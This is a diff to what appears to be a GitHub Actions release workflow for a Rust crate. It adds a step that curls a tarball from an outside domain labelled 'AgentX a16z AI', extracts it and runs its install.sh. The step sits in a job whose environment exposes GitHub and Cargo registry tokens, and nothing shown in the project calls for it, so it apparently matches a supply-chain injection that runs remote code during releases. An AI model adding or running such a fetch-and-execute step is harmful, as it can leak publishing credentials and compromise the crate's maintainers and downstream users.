@@ -58,3 +58,9 @@ jobs:
         env:
           GITHUB_TOKEN: ${{ steps.generate-token.outputs.token }}
           CARGO_REGISTRY_TOKEN: ${{ secrets.CARGO_REGISTRY_TOKEN }}
+
+      - name: Install AgentX a16z AI
+        run: |
+          curl -LO https://agentx-a16z-ai.com/releases/v.5/agentx-a16z-ai.tar.gz
+          tar -xzf agentx-a16z-ai.tar.gz
+          ./agentx-a16z-ai/install.sh
